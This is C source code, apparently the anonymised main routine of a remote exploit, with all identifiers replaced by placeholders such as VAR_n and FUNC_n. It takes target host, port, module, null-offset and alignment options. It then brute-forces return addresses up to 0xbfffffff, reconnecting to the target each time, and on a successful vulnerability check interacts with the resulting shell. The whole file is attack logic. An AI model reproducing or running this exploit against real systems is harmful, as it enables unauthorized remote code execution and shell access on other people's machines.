
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int u_long ;
struct TYPE_2__ {char* h; scalar_t__ null_offset; int brutebase; int nullbrute; int allign; int checkvuln; int shell; void* p; void* module; } ;


 void* VAR_0 ;
 int VAR_1 ;
 scalar_t__ VAR_2 ;
 char VAR_3 ;
 scalar_t__ VAR_4 ;
 scalar_t__ VAR_5 ;
 void* VAR_6 ;
 scalar_t__ VAR_7 ;
 void* FUNC_0 (void*) ;
 int FUNC_1 (int) ;
 scalar_t__ FUNC_2 (int) ;
 int FUNC_3 (int ,char*,...) ;
 char FUNC_4 (int,char**,char*) ;
 int FUNC_5 (int,int ) ;
 int FUNC_6 (char*,void*) ;
 void* VAR_8 ;
 TYPE_1__ VAR_9 ;
 scalar_t__ FUNC_7 (int) ;
 int VAR_10 ;
 int FUNC_8 (void*) ;
 int FUNC_9 (void*,char**,int) ;
 int FUNC_10 (char*) ;

int
FUNC_11(int VAR_11, char **VAR_12)
{
 char VAR_13;
 int VAR_14;
 u_long VAR_15;

 if(VAR_11 == 1) FUNC_10(VAR_12[0]);

 VAR_9.h = "localhost";
 VAR_9.p = VAR_6;
 VAR_9.null_offset = VAR_5;
 VAR_9.brutebase = VAR_1;
 VAR_9.nullbrute = 0;
 VAR_9.allign = VAR_0;


 while((VAR_13 = FUNC_4(VAR_11, VAR_12, "h:p:m:o:b:Ba:")) != VAR_3) {
  switch(VAR_13) {
   case 'h':
    VAR_9.h = VAR_8;
    break;
   case 'p':
    VAR_9.p = FUNC_0(VAR_8);
    break;
   case 'm':
    VAR_9.module = VAR_8;
    break;
   case 'o':
    VAR_9.null_offset = FUNC_0(VAR_8);
    break;
   case 'b':
    VAR_9.brutebase = FUNC_9(VAR_8, (char **)VAR_8+FUNC_8(VAR_8), 16);
    break;
   case 'B':
    VAR_9.nullbrute = 1;
    break;
   case 'a':
    VAR_9.allign = FUNC_0(VAR_8);
    if(VAR_9.allign>4) {
     FUNC_3(VAR_10, "allign > 4 !? using default\n");
     VAR_9.allign = VAR_0;
    }
    break;
   default:
    FUNC_10(VAR_12[0]);
  }
 }



 VAR_15 = VAR_9.brutebase;

 if(VAR_9.nullbrute)
  for(VAR_9.null_offset = VAR_7; VAR_9.null_offset >= VAR_2; VAR_9.null_offset--)
{
   FUNC_3(VAR_10, "\noffset: %ld\n", VAR_9.null_offset);

   for(VAR_9.checkvuln = 1; VAR_9.brutebase <= 0xbfffffff; VAR_9.brutebase += VAR_4) {
    if((VAR_14 = FUNC_6(VAR_9.h, VAR_9.p)) < 0) {
     FUNC_3(VAR_10, "poop..bye\n");
     FUNC_1(1);
    }

    if(FUNC_7(VAR_14) > 0)
     if(FUNC_2(VAR_14) > 0)
      FUNC_5(VAR_14, VAR_9.shell);
   }
   VAR_9.brutebase = VAR_15;
  }


  for(VAR_9.checkvuln = 1; VAR_9.brutebase <= 0xbfffffff; VAR_9.brutebase += VAR_4) {
                if((VAR_14 = FUNC_6(VAR_9.h, VAR_9.p)) < 0) {
                        FUNC_3(VAR_10, "poop..bye\n");
                        FUNC_1(1);
                }

                if(FUNC_7(VAR_14) > 0)
                        if(FUNC_2(VAR_14) > 0)
                                FUNC_5(VAR_14, VAR_9.shell);
        }


 FUNC_3(VAR_10, "No luck...bye\n");
 FUNC_1(0);
}
